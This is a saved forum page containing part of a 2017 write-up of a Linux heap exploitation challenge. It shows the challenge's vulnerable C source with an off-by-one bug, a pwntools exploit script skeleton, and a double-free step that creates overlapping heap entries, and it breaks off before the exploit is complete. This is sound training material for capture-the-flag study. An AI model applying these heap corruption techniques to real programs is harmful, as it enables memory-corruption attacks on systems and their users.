<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Heap Exploitation | Playing with chunks! - Exploit Development - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="###Solving a Heap exploitation challenge :smiley: 
In the name of Allah, the most beneficent, the most merciful. 



Thanks to @_py and @n0tnu11  who encouraged me, to write about such thing.. 


I want to say sorry, cau&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="2055.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="wZF24Cm0RdROKqo1kh52kzLOp"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="wZF24Cm0RdROKqo1kh52kzLOp"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Heap Exploitation | Playing with chunks!&#39;" href="2055.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/3/3b06c15480413792b373d01eaa928117d7c2ed55.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/3/3b06c15480413792b373d01eaa928117d7c2ed55.png" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055" />
<meta property="og:title" content="Heap Exploitation | Playing with chunks!" />
<meta name="twitter:title" content="Heap Exploitation | Playing with chunks!" />
<meta property="og:description" content="###Solving a Heap exploitation challenge ðŸ˜ƒ  In the name of Allah, the most beneficent, the most merciful.     Thanks to @_py and @n0tnu11  who encouraged me, to write about such thing..    I want to say sorry, cause i donâ€™t write alot more articles, you know guys, studies ðŸ˜“..    It wasnâ€™t easy for me to solve this challenge, took me alot of testing, almost two days.    Hello everyone to this article..    For learning purposes ðŸ™‚    Challenge is only solved by 35, was 26 ..." />
<meta name="twitter:description" content="###Solving a Heap exploitation challenge ðŸ˜ƒ  In the name of Allah, the most beneficent, the most merciful.     Thanks to @_py and @n0tnu11  who encouraged me, to write about such thing..    I want to say sorry, cause i donâ€™t write alot more articles, you know guys, studies ðŸ˜“..    It wasnâ€™t easy for me to solve this challenge, took me alot of testing, almost two days.    Hello everyone to this article..    For learning purposes ðŸ™‚    Challenge is only solved by 35, was 26 ..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="heap" />
<meta property="og:article:tag" content="pwning" />
<meta property="og:article:tag" content="linux" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="7 mins ðŸ•‘" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="33 â¤" />
<meta property="article:published_time" content="2017-05-18T21:45:36+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="2055.html">Heap Exploitation | Playing with chunks!</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/exploit-development/53.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #92278F'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Exploit Development</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/heap.html' class='discourse-tag' rel="tag">heap</a>, 
            <a href='../../tag/pwning.html' class='discourse-tag' rel="tag">pwning</a>, 
            <a href='../../tag/linux.html' class='discourse-tag' rel="tag">linux</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Heap Exploitation | Playing with chunks!'>
      <link itemprop='url' href='2055.html'>
      <meta itemprop='datePublished' content='2017-05-18T21:45:35Z'>
        <meta itemprop='articleSection' content='Exploit Development'>
      <meta itemprop='keywords' content='heap, pwning, linux'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>

                <link itemprop="mainEntityOfPage" href="2055.html">

                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/3/3b06c15480413792b373d01eaa928117d7c2ed55.png">

              <span class="crawler-post-infos">
                  <time  datetime='2017-05-18T21:45:36Z' class='post-time'>
                    May 18, 2017,  9:45pm
                  </time>
                  <meta itemprop='dateModified' content='2017-05-19T11:31:48Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>##<span class="hashtag-raw">#Solving</span> a Heap exploitation challenge <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"><br>
In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<ul>
<li>
<p>Thanks to <a class="mention" href="../../u/_py.html">@_py</a> and <a class="mention" href="../../u/n0tnu11.html">@n0tnu11</a>  who encouraged me, to write about such thing..</p>
</li>
<li>
<p>I want to say sorry, cause i donâ€™t write alot more articles, you know guys, studies <img src="../../images/emoji/twitter/sweat8e5e.png?v=15" title=":sweat:" class="emoji" alt=":sweat:" loading="lazy" width="20" height="20">..</p>
</li>
<li>
<p>It wasnâ€™t easy for me to solve this challenge, took me alot of testing, almost two days.</p>
</li>
<li>
<p>Hello everyone to this article..</p>
</li>
<li>
<p>For learning purposes <img src="../../images/emoji/twitter/slight_smile8e5e.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
</li>
<li>
<p>Challenge is only solved by 35, was 26 when i finished it!</p>
</li>
</ul>
<p>Before we start, letâ€™s take a look at the informations given on the binary and what kind of protections are ON..</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/3/3b06c15480413792b373d01eaa928117d7c2ed55.png" data-download-href="/uploads/short-url/8qaDUmS7Q0S9GVjPu9JhzIkZjgh.png?dl=1" title="he_p.png" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/3b06c15480413792b373d01eaa928117d7c2ed55.png" width="690" height="141"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">he_p.png</span><span class="informations">965Ã—198 10.9 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Oh yeah, the following protections are ON:</p>
<blockquote>
<p>ASLR<br>
NX<br>
SSP<br>
PARTIAL RELRO</p>
</blockquote>
<p>Awesome, a perfect target, to start our heap exploitation adventure!<br>
We have also, the source code, and the binary is given!</p>
<ul>
<li>Better find a music to listen to:</li>
<li>I will listen to <a href="../../../external.html?link=https://www.youtube.com/watch?v=JgJ4g90u2V8" rel="noopener nofollow ugc">this</a>!</li>
</ul>
<p>Awesome, let me first run my VM machine, and then download the binary from the server!<br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/c/c85d994691de0247a47988f1b5d38a6c1d1b5060.png" data-download-href="/uploads/short-url/sAw1LmyGjvEnuBZ8a6CnOBdTOcU.png?dl=1" title="he_p1.png" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/c85d994691de0247a47988f1b5d38a6c1d1b5060.png" width="690" height="195"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">he_p1.png</span><span class="informations">699Ã—198 30 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Great, we now, should take a look at the source given, and try to make a plan for the attack..<br>
We have 3 functions that seem important:</p>
<ul>
<li>creation() to allocate..</li>
<li>change() to edit..</li>
<li>delete() to free..</li>
<li>show() to show information..</li>
</ul>
<p>Awesome, so now letâ€™s take a look at the functions.. <img src="../../images/emoji/twitter/yum8e5e.png?v=15" title=":yum:" class="emoji" alt=":yum:" loading="lazy" width="20" height="20"></p>
<pre data-code-wrap="c"><code class="lang-c">struct entry *creation() {
    char name[64];
    struct entry *e;
 
    e = (struct entry *) malloc(sizeof(struct entry));
 
    printf("Name: ");
    fgets(name, NAME_LEN_MAX, stdin);
    name[strlen(name)-1] = 0;
    e-&gt;name = malloc(strlen(name));
    strcpy(e-&gt;name, name);
 
    printf("Age: ");
    fgets(name,6,stdin);
    e-&gt;age = atoi(name);
 
    return e;
}
</code></pre>
<p>Uhmm, it will allocate 2 chunks, one built on the struct of entry..<br>
Keep in mind that the struct of entry looks like this:</p>
<pre data-code-wrap="c"><code class="lang-c">struct entry {
  int age;
  char *name;
};
</code></pre>
<ul>
<li>So, in the first allocated chunk there will be stored the age, and a pointer to next chunk, where name will be stored!</li>
</ul>
<p>Great!<br>
Now letâ€™s see the delete function!</p>
<pre data-code-wrap="c"><code class="lang-c">void delete(int i) {
    free(directory[i]-&gt;name);
    free(directory[i]);
}
</code></pre>
<ul>
<li>It will free the chunk containing the age and pointer to name, and the next chunk that contains the name!</li>
</ul>
<p>The show() function:</p>
<pre data-code-wrap="c"><code class="lang-c">void show(int i) {
    printf("[%d] %s, %d years old\n", i, directory[i]-&gt;name, directory[i]-&gt;age);
}
</code></pre>
<ul>
<li>Seems like it will print information about one chunk we choose!</li>
<li>May lead to some kind of leak, if we controlled the *name..</li>
</ul>
<p>And the change() function!</p>
<pre data-code-wrap="c"><code class="lang-c">void change(int e) {
    char name[64];
 
    printf("New name: ");
    fgets(name, strlen(directory[e]-&gt;name)+1, stdin);
 
    name[strlen(name)] = 0;
    strcpy(directory[e]-&gt;name, name);
    printf("New age: ");
    fgets(name, 6, stdin);
    directory[e]-&gt;age = atoi(name);
}
</code></pre>
<ul>
<li>It will strcpy our first input to directory[e]-&gt;name, and the second input will be put in age!</li>
<li>Thereâ€™s seems to be an offbyone bug there, may allow us to change the size of the next chunk..</li>
<li>We can overwrite arbitrary address if we controlled *name..</li>
</ul>
<p>Questions that come to our head now!</p>
<ul>
<li>How can we overwrite the *name?</li>
</ul>
<p>Well, this is the real problem, we should become creative..<br>
Letâ€™s start the program, and start analysing memory!</p>
<p>When we start it, we get this menu..<br>
<img src="../../../0x00sec.s3.amazonaws.com/original/2X/e/e148cc032808ec0f7a142ddfbf8e7b8ed4fe4c8e.png" width="341" height="221"></p>
<p>Letâ€™s start it again, but this time, using GDB, to analyse memory, and see our chunks..</p>
<ul>
<li>gdb ch44 -q</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/6/6b77c48d0972450d5e7a6eedd62094856d9541b8.png" width="408" height="239"></p>
<p>Awesome, letâ€™s now create a new entry!<br>
<img src="../../../0x00sec.s3.amazonaws.com/original/2X/9/93e84fdab3f7f29e0b4a2f7cd9f9ac25225a6706.png" width="169" height="104"></p>
<p>Great, now letâ€™s take a look at memory, we will look at &amp;directory!</p>
<ul>
<li>Ctrl + C to interrupt the execution and write c in gdb so it continues executing again!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/7/751cded05b2260fc2855ab10bf085710804190f1.png" width="382" height="36"></p>
<p>Alright, letâ€™s see &amp;directory!<br>
<img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/c1747097d6f06c9adfd74dbeb2ebcf2900cf78bc.png" width="672" height="112"></p>
<p>Awesome, so the first entry is here: 0x605010!<br>
Letâ€™s take a look at whatâ€™s in this area!</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/6/63d2639d040bfb15e3ec773d279dc49b88374edb.png" width="527" height="113"></p>
<p>Great!<br>
The structure of the chunk looks like as we said before!<br>
( size + age + *name + prev_size + size + name + junk.. + wilderness )</p>
<p>Awesome, letâ€™s start writing the functions in our exploit.py</p>
<pre data-code-wrap="py"><code class="lang-py">#!/usr/bin/python
from pwn import *

# PROCESS
c = process("./ch44")

# FUNCTIONS
def allocate( nm, age ):
	c.sendline('1')
	c.recvuntil(': ')
	c.sendline( nm )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
def free( id ):
	c.sendline('2')
	c.recvuntil(': ')
	c.sendline(str(id))
	c.recvuntil('&gt;')
def view( id ):
	c.sendline('4')
	c.recvuntil('[' + str(id) + '] ')
	name = c.recvuntil(', ')[:-2]
	age = c.recvuntil(' years')[:-6]
	c.recvuntil('&gt;')
	return name, age
def edit( id, name, age ):
	c.sendline('3')
	c.recvuntil(': ')
	c.sendline( str(id) )
	c.recvuntil(': ')
	c.sendline( name )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
# ATTACH
pause()

# EXPLOIT


# INTERACTIVE
c.interactive()
</code></pre>
<p>Seems awesome, now we can start writing our exploit!</p>
<ul>
<li>We will mostly modify the EXPLOIT part <img src="../../images/emoji/twitter/wink8e5e.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></li>
</ul>
<p>letâ€™s start by allocating some chunks, letâ€™s say 4 chunks..<br>
What size of each chunk will we choose ?</p>
<ul>
<li>After analysing a bit and trying different chunk sizes, iâ€™ll choose 56, cause we can control all the chunk with that size, allowing us to overwrite the next chunk size with the offbyone we saw before!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )
allocate( 'D'*56, 15 )
</code></pre>
<p>Letâ€™s run the exploit now, and attach it to GDB!<br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/c/c3a0055c6c0f5ceb594f8d9e48128ee8a8bae14c.png" data-download-href="/uploads/short-url/rUzWTTdcQHiXDZ22qk60iGSz6YA.png?dl=1" title="he_p8.png" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/c3a0055c6c0f5ceb594f8d9e48128ee8a8bae14c.png" width="690" height="332"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">he_p8.png</span><span class="informations">719Ã—346 90.9 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<ul>
<li>Now, we should write continue ( c ) in gdb and then press enter in the other terminal, where the exploit.py is running ( pause() )!</li>
<li>After doing that, the four chunks will be allocated, and we will use CTRL + C in gdb again and then examine them in memory!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/a/a3eb3871e4b9a8eb372b559022fc750393ad8dc9.png" width="527" height="378"></p>
<p>Great, all seems working just great!<br>
What if we now free some chunks what will happen?</p>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )
allocate( 'D'*56, 15 )
free(2)
free(1)
</code></pre>
<ul>
<li>Alright letâ€™s run the exploit again, and see how the chunks look like now!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/4/4a60bcefc820e9e4655f78827f8790b70b59516b.png" width="525" height="377"></p>
<ul>
<li>We can see that the FD of chunk 1 was set to the prev_size of chunk 2..</li>
<li>So now, what do we have?</li>
<li>We have 4 free chunks.. letâ€™s try and allocate something that will fit the chunk with 0x21 in size..</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/3997768af33f23ce7e278227f377993937ca950f.png" width="531" height="112"></p>
<ul>
<li>HELL YEAH!</li>
<li>So, this maybe can help us, but not in this situation..</li>
<li>Cause chunk 1 entry looks like this:</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/4/43a9c0fdd7999db8ad413be2b15904115d6a3c8b.png" width="534" height="35"></p>
<ul>
<li>Where 0x20690d0 is where chunk 2 entry starts..</li>
<li>Then itâ€™s considered as a name..</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/9/9ef357056212b79082c93a148dc06c5edb64a54b.png" width="686" height="80"></p>
<ul>
<li>Keep this in mind, it may help us later..</li>
<li>And since this way wonâ€™t help us alot now, letâ€™s try and become more creative..</li>
<li>When we free a chunk, it will be placed in a free_list, then when we allocate a chunk it will placed there if the size fits it!</li>
</ul>
<blockquote></blockquote>
<p><code>So when we free chunk 1 then chunk 2 Free_list will look like this : </code><br>
Â±------------------------Â±------------------------+</p>
<ul>
<li>////////CHUNK1/////// + ////////CHUNK2/////// +<br>
Â±------------------------Â±------------------------+<br>
<code>Then, when the next allocation happens, the first chunk to be filled is the last free()'d which is chunk2..</code></li>
</ul>
<p>But what if we freeâ€™d chunk2 two times, if we did it directly a crash occurs!</p>
<ul>
<li>We can free chunk2 then chunk1 then chunk2 again, and this will prevent the crash from happening ( double free )â€¦</li>
<li>And free_list will look like this.. chunk2 â†’ chunk1 â†’ NULL</li>
</ul>
<p>Awesome, letâ€™s try that!</p>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )
allocate( 'D'*56, 15 )

free(2)
free(1)
free(2)
</code></pre>
<p>And it worked, what if allocated another chunk of same size ( 56 ) now ?</p>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )
allocate( 'D'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'E'*56, 15 )
</code></pre>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/7/7409a54b4fbb0b4db430bbc1f0489905c5330c83.png" width="682" height="72"></p>
<ul>
<li>Uhmm, everything seems normal, letâ€™s examine memory and see how &amp;directory looks like!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/5/51605da5c0dcb1e9ed15759218657c92a9cd8770.png" width="690" height="53"></p>
<ul>
<li>Oh yeah, so we got two different index in directory that point to the same to the same area!</li>
<li>So, if we free()'d one of them, we will have some kind of heapleak..</li>
<li>We will try free()'ing chunk2 since itâ€™s the last one that got filled and chunk1 is now on top of free_list, free()'ing it will result in a crash!</li>
